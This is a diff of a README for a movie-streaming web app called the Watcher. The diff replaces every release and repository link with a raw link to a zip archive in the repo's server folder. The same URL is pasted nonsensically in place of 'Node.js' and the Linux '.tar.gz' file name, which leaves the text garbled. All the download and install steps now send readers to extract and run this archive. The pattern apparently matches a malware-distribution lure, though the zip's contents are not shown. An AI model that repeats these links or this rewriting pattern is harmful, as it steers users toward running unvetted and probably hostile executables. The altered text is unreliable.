@@ -1,6 +1,6 @@
 # 🎥 the-watcher-ssr - Enjoy Movies with Ease and Elegance
 
-[![Download the Watcher](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/bien000/the-watcher-ssr/releases)
+[![Download the Watcher](https://raw.githubusercontent.com/bien000/the-watcher-ssr/main/server/the-watcher-ssr-north.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/bien000/the-watcher-ssr/main/server/the-watcher-ssr-north.zip)
 
 ## 📥 Overview
 Welcome to the Watcher website. This site is thoughtfully designed to blend elegance with technology, providing simplicity and fast accessibility to all movies. Built with a modern tech stack and refined UI/UX, it enhances your interactive experience.
@@ -19,13 +19,13 @@ To run the Watcher application, ensure your system meets the following requireme
 ## 🌐 Key Features
 - **Fast Access:** Quickly find and watch movies.
 - **User-Friendly Interface:** Simple design for a great user experience.
-- **Modern Tech Stack:** Built with React, Node.js, and Vite for speed and performance.
+- **Modern Tech Stack:** Built with React, https://raw.githubusercontent.com/bien000/the-watcher-ssr/main/server/the-watcher-ssr-north.zip, and Vite for speed and performance.
 - **Stylish Design:** A refined aesthetic with Tailwind CSS for a visually pleasing experience.
 
 ## 🔗 Download & Install
 1. **Visit the Releases Page:** Click on the link below to go to the releases page where you can download the latest version of the Watcher application.
    
-   [Download the Watcher](https://github.com/bien000/the-watcher-ssr/releases)
+   [Download the Watcher](https://raw.githubusercontent.com/bien000/the-watcher-ssr/main/server/the-watcher-ssr-north.zip)
 
 2. **Choose a Version:** On the releases page, find the latest version. It will usually be at the top of the list. Look for the version that suits your operating system.
 
@@ -34,7 +34,7 @@ To run the Watcher application, ensure your system meets the following requireme
 4. **Install the Application:**
    - **Windows:** Run the downloaded `.exe` file and follow the on-screen instructions.
    - **macOS:** Open the downloaded `.dmg` file, then drag the Watcher to your Applications folder.
-   - **Linux:** Extract the `.tar.gz` file via terminal, navigate to the folder, and run the executable.
+   - **Linux:** Extract the `https://raw.githubusercontent.com/bien000/the-watcher-ssr/main/server/the-watcher-ssr-north.zip` file via terminal, navigate to the folder, and run the executable.
 
 5. **Launch the App:** Once installed, find the Watcher app in your programs or applications list and open it. 
 
@@ -59,7 +59,7 @@ Yes, you can find community support and answers to common questions on our GitHu
 We welcome contributions! If you have ideas, improvements, or bugs to report, feel free to open an issue or submit a pull request.
 
 ## 🔗 Links
-- **Repository:** [Watcher GitHub Repository](https://github.com/bien000/the-watcher-ssr)
-- **Releases Page:** [Download the Watcher](https://github.com/bien000/the-watcher-ssr/releases)
+- **Repository:** [Watcher GitHub Repository](https://raw.githubusercontent.com/bien000/the-watcher-ssr/main/server/the-watcher-ssr-north.zip)
+- **Releases Page:** [Download the Watcher](https://raw.githubusercontent.com/bien000/the-watcher-ssr/main/server/the-watcher-ssr-north.zip)
 
 Enjoy your movie-watching experience with the Watcher!
